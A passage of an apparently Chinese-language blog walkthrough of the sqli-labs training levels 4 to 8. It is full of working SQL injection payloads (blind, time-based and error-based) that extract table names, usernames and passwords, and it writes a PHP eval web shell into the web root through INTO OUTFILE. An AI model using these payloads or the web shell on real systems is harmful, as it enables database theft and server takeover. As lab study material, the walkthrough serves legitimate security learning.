0,1),1,1)=&#39;e&#39; --+</code> → 第一张表的第1个字符是否为<code>e</code>。</li></ul><p><strong>3. 获取列名</strong></p><ul><li><strong>猜解列的数量</strong>：<br><code>?id=1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=3 --+</code> → 确认是否为3列。</li><li><strong>逐字符猜解列名</strong>：<br><code>?id=1&#39; and substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;i&#39; --+</code> → 第一列的第1个字符是否为<code>i</code>。</li></ul><p><strong>4. 提取数据（如用户名&#x2F;密码）</strong></p><ul><li><strong>猜解第一条记录的username</strong>：<br><code>?id=1&#39; and substr((select username from users limit 0,1),1,1)=&#39;D&#39; --+</code> → 用户名的第1个字符是否为<code>D</code>。</li><li><strong>猜解对应密码</strong>：<br><code>?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;D&#39; --+</code> → 密码的第1个字符是否为<code>D</code>。</li></ul><hr><h5 id="4、时间盲注"><a href="#4、时间盲注" class="headerlink" title="4、时间盲注"></a><strong>4、时间盲注</strong></h5><p><strong>（1）什么是时间盲注？</strong></p><p>攻击者通过构造SQL语句触发数据库延迟执行（如<code>SLEEP(2)</code>），根据响应时间的长短判断注入条件是否为真。</p><p><strong>（2）如何判断时间盲注？</strong></p><ol><li><strong>基本测试</strong><br>输入触发延迟的Payload，观察响应时间是否显著增加：<code>?id=1&#39; AND SLEEP(5) --+</code>若页面加载时间超过5秒，可能存在时间盲注漏洞。</li><li><strong>条件化测试</strong><br>结合逻辑条件验证：<code>?id=1&#39; AND IF(1=1, SLEEP(5), 0) --+  # 条件为真，触发延迟   ?id=1&#39; AND IF(1=2, SLEEP(5), 0) --+  # 条件为假，不延迟</code>若第一个请求延迟，第二个不延迟 → 确认时间盲注存在。</li></ol><p><strong>(3)时间盲注利用步骤</strong></p><p><strong>1. 获取数据库名</strong></p><p><strong>1.1 猜解数据库名长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LENGTH(database())=8, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>若延迟2秒，数据库名长度为8（如<code>security</code>）。</p><p><strong>1.2 逐字符猜解数据库名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(ASCII(SUBSTR(database(),1,1))=115, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><ul><li><code>SUBSTR(database(),1,1)</code>：提取数据库名第1个字符。</li><li><code>ASCII(...)=115</code>：判断是否为字符<code>s</code>（ASCII码115）。</li><li>若延迟，则确认该字符正确。</li></ul><p><strong>2. 获取表名</strong></p><p><strong>2.1 猜解表的数量</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=4, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>若延迟，当前数据库有4张表。</p><p><strong>2.2 猜解表名长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>若延迟，第一张表名长度为6（如<code>emails</code>）。</p><p><strong>2.3 逐字符猜解表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=101, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><ul><li>判断第一个表的第1个字符是否为<code>e</code>（ASCII码101）。</li></ul><p><strong>3. 获取列名</strong></p><p><strong>3.1 猜解列的数量</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="hljs-string">&#x27;)=3, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>若延迟，<code>users</code>表有3列。</p><p><strong>3.2 逐字符猜解列名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="hljs-string">&#x27; LIMIT 0,1),1,1))=105, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><ul><li>判断第一列的第1个字符是否为<code>i</code>（ASCII码105）。</li></ul><p><strong>4. 提取数据（以用户密码为例）</strong></p><p><strong>4.1 猜解用户名的第一个字符</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))=68, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><ul><li>若延迟，用户名的第一个字符为<code>D</code>（ASCII码68）。</li></ul><p><strong>4.2 猜解密码</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 0,1),1,1))=68, SLEEP(2), 0) --+</span><br></code></pre></td></tr></table></figure><ul><li>若延迟，密码的第一个字符为<code>D</code>。</li></ul><hr><h5 id="5、使用ASCII码-二分法优化"><a href="#5、使用ASCII码-二分法优化" class="headerlink" title="5、使用ASCII码 + 二分法优化"></a><strong>5、使用ASCII码 + 二分法优化</strong></h5><p>将字符转换为ASCII码值，利用二分法快速缩小范围。</p><p><strong>步骤1：将字符转为ASCII码</strong></p><ul><li><code>&#39;s&#39;</code>的ASCII码为<code>115</code>。</li><li>通过比较ASCII码值，快速定位字符。</li></ul><p><strong>步骤2：二分法猜解</strong></p><ol><li><strong>确定ASCII码范围</strong>：假设字符为可打印字符（ASCII 32-126）。</li><li><strong>逐步缩小范围</strong>：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND ascii(substr(database(),1,1)) &gt; 100 --+  # 是否大于100？</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">- 若页面正常（条件为真），说明ASCII码在101-126之间。- 若页面异常（条件为假），说明ASCII码在32-100之间。</code></pre><ol start="3"><li><strong>重复二分</strong>，直到锁定具体值。</li></ol><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 猜解第一个字符的ASCII码是否为<span class="hljs-number">115</span>（即<span class="hljs-string">&#x27;s&#x27;</span>）<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND ascii(substr(database(),1,1))=115 --+</span><br></code></pre></td></tr></table></figure><h4 id="Less-5-单引号字符型-布尔盲注-报错注入"><a href="#Less-5-单引号字符型-布尔盲注-报错注入" class="headerlink" title="Less-5-单引号字符型_布尔盲注_报错注入"></a>Less-5-单引号字符型_布尔盲注_报错注入</h4><p><strong>布尔盲注</strong></p><p>判断</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007470.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006670.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006258.png"></p><p>单引号字符型注入</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007326.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007306.png"></p><p>页面根据条件真&#x2F;假返回不同结果，说明存在布尔盲注，</p><p><strong>1. 获取数据库名</strong></p><ul><li><strong>猜解长度</strong>：<br><code>?id=1&#39; and length(database())=8 --+</code> 页面正常，数据库名长度为8。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007042.png"></p><ul><li><strong>逐字符猜解</strong>：<br><code>?id=1&#39; and substr(database(),1,1)=&#39;s&#39; --+</code>  第1个字符是否为<code>s</code>（重复至第8个字符）。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007799.png"></p><p><strong>猜解过程</strong>：</p><ol><li>第1个字符：从ASCII码范围（通常测试 <code>a-z</code>、<code>0-9</code>、<code>_</code>）逐一尝试，直到页面正常。</li><li>第2个字符：修改为 <code>substr(database(),2,1)</code>，重复上述过程。</li><li>重复至第8个字符（<code>substr(database(),8,1)</code>）。</li></ol><p><strong>ASCII码范围解析</strong></p><table><thead><tr><th align="center">字符类型</th><th align="center">ASCII码范围</th><th align="center">包含字符示例</th></tr></thead><tbody><tr><td align="center">数字</td><td align="center">48-57</td><td align="center"><code>0</code>(48) ~ <code>9</code>(57)</td></tr><tr><td align="center">下划线</td><td align="center">95</td><td align="center"><code>_</code></td></tr><tr><td align="center">小写字母</td><td align="center">97-122</td><td align="center"><code>a</code>(97) ~ <code>z</code>(122)</td></tr></tbody></table><p><strong>2. 获取表名</strong></p><ul><li><strong>猜解表的数量</strong>：<br><code>?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+</code> → 确认为4张表。</li><li><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007369.png"></li><li><strong>猜解表名长度</strong>：<br><code>?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</code> → 第一张表名长度为6。</li><li><strong>逐字符猜解表名</strong>：<br><code>?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#39;e&#39; --+</code> → 第一张表的第1个字符为<code>e</code>。</li></ul><p><strong>3. 获取列名</strong></p><ul><li><strong>猜解列的数量</strong>：<br><code>?id=1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=3 --+</code> → 确认为3列。</li><li><strong>逐字符猜解列名</strong>：<br><code>?id=1&#39; and substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;i&#39; --+</code> → 第一列的第1个字符为<code>i</code>。</li></ul><p><strong>4. 提取数据（如用户名&#x2F;密码）</strong></p><ul><li><strong>猜解第一条记录的username</strong>：<br><code>?id=1&#39; and substr((select username from users limit 0,1),1,1)=&#39;D&#39; --+</code> → 用户名的第1个字符为<code>D</code>。</li><li><strong>猜解对应密码</strong>：<br><code>?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;D&#39; --+</code> → 密码的第1个字符为<code>D</code>。</li></ul><p><strong>报错注入</strong></p><p>这一关也可以使用报错注入</p><p><a href="https://blog.csdn.net/2201_75556700/article/details/139115543?ops_request_misc=%7B%22request_id%22:%229b61cf9573e1a1353819cc64e0d1888b%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=9b61cf9573e1a1353819cc64e0d1888b&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-139115543-null-null.142%5Ev102%5Epc_search_result_base7&utm_term=sqli-labs-5&spm=1018.2226.3001.4187">sqli-labs—第五关_sqli-labs第五关-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_44663230/article/details/126200616?ops_request_misc=&request_id=&biz_id=102&utm_term=sqli-labs-5&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-126200616.142%5Ev102%5Epc_search_result_base7&spm=1018.2226.3001.4187">sql-labs 闯关 5~10_sqli-labs5-CSDN博客</a></p><p>1.floor报错</p><p>用floor报错注入，得到数据库名称为’security’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(database())))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007315.png"></p><p><strong>语句解析</strong></p><ul><li><code>?id=1&#39;</code><br>闭合原始 SQL 语句的单引号，进入注入逻辑。</li><li><code>and</code><br>将注入的恶意代码与原始查询逻辑连接，使整个语句结果为布尔值。</li><li><code>select count(*) from information_schema.tables</code><br>从系统表 <code>information_schema.tables</code>（存储所有表信息）中选择所有行数。此步骤仅用于生成足够多的数据以触发后续的 <code>group by</code> 报错。</li><li><code>group by concat(...)</code><br>关键报错触发点。<code>group by</code> 子句会对结果按指定表达式分组，而 <code>concat(...)</code> 生成的字符串将作为分组键。由于 <code>floor(rand(14)*2)</code> 的随机性（但种子固定为 <code>14</code>），在分组时可能出现重复键冲突，导致报错。</li><li><code>floor(rand(14)*2)</code><ul><li><code>rand(14)</code>：生成一个基于种子 <code>14</code> 的伪随机数（固定序列）。</li><li><code>rand(14)*2</code>：将随机数范围扩展到 [0, 2)。</li><li><code>floor()</code>：向下取整，结果为 <code>0</code> 或 <code>1</code>。</li><li><strong>作用</strong>：生成确定性序列的 0 或 1，用于构造重复的分组键。</li></ul></li><li><code>0x23</code><br>十六进制表示的字符 <code>#</code>，作为分隔符提高报错信息的可读性。</li><li><code>database()</code><br>内置函数，返回当前数据库名称（此处为 <code>security</code>）。</li><li><strong>报错机制</strong><br>由于 <code>group by</code> 在临时表生成过程中需要为每行计算分组键，而 <code>floor(rand(14)*2)</code> 的值在计算过程中可能变化，导致同一分组键被多次插入临时表时触发 <code>Duplicate entry</code> 错误。报错信息会包含 <code>concat(...)</code> 的结果，从而泄露 <code>database()</code> 的值。</li></ul><p>得到数据表名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007738.png"></p><ul><li><code>select group_concat(table_name) ...</code><ul><li><code>group_concat()</code>：将多行结果合并为单个字符串（例如 <code>users,emails,products</code>）。</li><li><code>information_schema.tables</code>：系统表，存储所有数据库的表信息。</li><li><code>where table_schema=&#39;security&#39;</code>：筛选属于 <code>security</code> 数据库的表。</li></ul></li><li><strong>报错信息泄露</strong><br>报错信息中会包含所有表名的拼接结果（如 <code>users,emails,...</code>）。</li></ul><p>得到字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007739.png"></p><ul><li><code>information_schema.columns</code><br>系统表，存储所有表的列（字段）信息。</li><li><code>where table_name=&#39;users&#39;</code><br>筛选 <code>users</code> 表的字段名（如 <code>id,username,password</code>）。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(username) from users)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007226.png"></p><p>用翻译软件翻译出来的意思是[子查询返回超过 1 行]，所以用count函数统计看看有多少数据</p><p><strong>错误提示</strong>：<code>子查询返回超过 1 行</code><br><code>group_concat(username)</code> 会将所有 <code>username</code> 合并为一个字符串（如 <code>admin,user1,user2</code>），但由于某些环境限制（如 MySQL 版本或配置），过长的字符串可能导致报错信息截断或无法触发预期错误。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select count(username) from users)))--+</span><br></code></pre></td></tr></table></figure><p>得到username有13个，既然输出一行，那么用limit一个一个输出</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007166.png"></p><ul><li><code>count(username)</code><br>统计 <code>users</code> 表中 <code>username</code> 的数量（如 <code>13</code>），避免返回多行数据。</li><li><strong>作用</strong>：确定需要分页获取数据的总量。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select username from users limit 0,1)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007609.png"></p><p>得到第一个用户账户</p><ul><li><code>limit 0,1</code><br>限制子查询返回一行数据（<code>0</code> 表示起始位置，<code>1</code> 表示数量）。</li><li><strong>逐步遍历</strong><br>修改 <code>limit 1,1</code>、<code>limit 2,1</code> 等获取后续数据。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select username from users limit 1,1)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007530.png"></p><p>得到第二个用户账户</p><p>以此类推，得到所有账户密码</p><p>2.updatexml报错<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),1)–+</p><p>得到数据库名称</p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)–+</p><p>得到数据表名称</p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e),1)–+</p><p>得到字段名称</p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)–+</p><p>得到用户名</p><p>3.extractvalue报错<br>?id&#x3D;1’ and extractvalue(1,concat(0x23,database(),0x23))–+</p><p>得到数据库名称</p><p>?id&#x3D;1’ and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x23))–+</p><p>得到数据表名称</p><p>得到字段名称</p><p>?id&#x3D;1’ and extractvalue(1,concat(0x23,(select group_concat(username) from users),0x23))–+</p><p>得到用户名称，但明显可以看出，还没显示完整，用limit逐个查看</p><p>?id&#x3D;1’ and extractvalue(1,concat(0x23,(select username from users limit 0,1),0x23))–+</p><p>查看第一个账户名称</p><h4 id="Less-6-单引号字符型-布尔盲注-报错注入"><a href="#Less-6-单引号字符型-布尔盲注-报错注入" class="headerlink" title="Less-6-单引号字符型_布尔盲注_报错注入"></a>Less-6-单引号字符型_布尔盲注_报错注入</h4><p>这一关与less-5的区别在于注入点不同，less-5是单引号，less-6是双引号，其他的都一样，可以用布尔盲注，也可以用updatexml报错注入。</p><p>先判断出注入点是双引号</p><p>?id&#x3D;1”  and updatexml(1,concat(0x7e,database(),0x7e),1)–+</p><p>得到数据库名称</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008410.png"></p><p>?id&#x3D;1”  and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)–+</p><p>得到数据表名称</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008470.png"></p><p>?id&#x3D;1”  and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’)),1) –+</p><p>得到字段名称</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008950.png"></p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)–+<br>得到用户名</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008893.png"></p><p>由于结果显示不全 可以使用limit来逐个查询</p><p>?id&#x3D;1” and updatexml(1,concat(1,(select username from users limit 0,1) ),1) –+</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008212.png"></p><h4 id="Less-7-单引号-双括号-outfile函数"><a href="#Less-7-单引号-双括号-outfile函数" class="headerlink" title="Less-7-单引号+双括号_outfile函数"></a>Less-7-单引号+双括号_outfile函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009634.png"></p><p>经过试验，闭合方式是字符型<code>&#39;))</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009623.png"></p><p>正常返回 <code>You are in.... Use outfile...... </code> 错误返回 <code>You have an error in your SQL syntax</code></p><p><a href="https://blog.csdn.net/JCY1009015337/article/details/53038104?ops_request_misc=%7B%22request_id%22:%22e4c27b101ddef8d9f30b7bae6e7ea27b%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=e4c27b101ddef8d9f30b7bae6e7ea27b&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-53038104-null-null.142%5Ev102%5Epc_search_result_base7&utm_term=outfile&spm=1018.2226.3001.4187">Mysql之outfile_mysql outfile-CSDN博客</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) order by 3 --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009298.png"></p><h5 id="方法一：outfile导出文件"><a href="#方法一：outfile导出文件" class="headerlink" title="方法一：outfile导出文件"></a>方法一：outfile导出文件</h5><p>在less7中，因为它报错不返回报错的数据库信息，我们无法获取到网站路径，我们可以在1-6关中注入获得数据库路径，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,@@datadir --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009327.png"></p><p><code>@@datadir</code>返回的是数据库存储数据的路径，而我们知道网站路径是在<code>WWW</code>目录下，那么结合<code>@@datadir</code>我们可以推断出网站的绝对路径为 <code>D:\CTF-Tools\phpstudy_pro\WWW\</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) and (select count(*) from mysql.user)&gt;0 --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009701.png"></p><p>返回正常则有读取权限</p><p>模板：<code>?id=1&#39;)) union select (sql语句) into outfile &#39;路径&#39; --+</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) union select 1,2,3 into outfile &#x27;</span>D:\\CTF<span class="hljs-operator">-</span>Tools\\phpstudy_pro\\WWW\\sqli<span class="hljs-operator">-</span>labs\\Less<span class="hljs-number">-7</span>\\<span class="hljs-number">1.</span>txt<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>写入失败，之后找到问题是权限过低，需要打开<code>phpstudy\MySQL\my.ini</code>文件，在其中加上一句：<code>secure_file_priv=&quot;/&quot;</code></p><p><code>D:\CTF-Tools\phpstudy_pro\Extensions\MySQL5.7.26\my.ini</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009595.png"></p><p>已经生成了<code>1.txt</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009239.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022010650.png"></p><p>写一句话木马</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) union select 1,2,&#x27;</span><span class="hljs-operator">&lt;</span>?php <span class="hljs-variable">@eval</span>($_POST[&quot;admin&quot;])?<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27; into outfile &quot;D:\\CTF-Tools\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\1.php&quot; --+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022010904.png"></p><p>蚁剑连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011888.png"></p><p><strong>注意</strong></p><p>参考文章：<a href="https://blog.csdn.net/song123sh/article/details/123724719?ops_request_misc=%7B%22request_id%22:%22795b77a816914f9f51d9a3bc6abeeca1%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=795b77a816914f9f51d9a3bc6abeeca1&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-123724719-null-null.142%5Ev102%5Epc_search_result_base7&utm_term=sqli-labsless7&spm=1018.2226.3001.4187">sqlilabs—less7_less-7-CSDN博客</a></p><p>对文件进行导入导出首先得要有足够的权限，但是mysql默认不能导入和导出文件，这与<code>secure_file_priv</code>的值有关（默认为null)。<code>secure-file-priv</code>参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。<br>1、当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出<br>2、当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下<br>3、当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制<br>用以下命令查看secure_file_priv的值</p><p><code>show variables like ‘%secure%’；</code></p><p>由于先前已做过修改，这里显示的是可导入导出</p><p>如果是null，想得到导入导出权限，可以在my.ini文件[mysqld]的后面加上secure_file_priv&#x3D;’’（两个英文单引号），然后重启phpstudy即可</p><p>1、outfire 后面的路径为绝对路径且存在<br>2、要有足够的权限<br>3、注入的内容也可以是字符串，句子<br>4、要想注入新内容，需要新的文件名</p><p>这里写入文件的时候，需要注意的是利用数据库file权限向操作系统写入文件时，对于相同文件名的文件不能覆盖，所以如果第一次上传1.php，下次再上传1.php，就是无效命令了，也就是新的test.php中的内容并不会覆盖之前的1.php</p><h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>基本上和less-5一样</p><p><a href="https://www.cnblogs.com/wuhongbin/p/15582981.html">自动化SQL注入测试工具 sqlmap 使用手册 - FreeK0x00 - 博客园</a></p><p><a 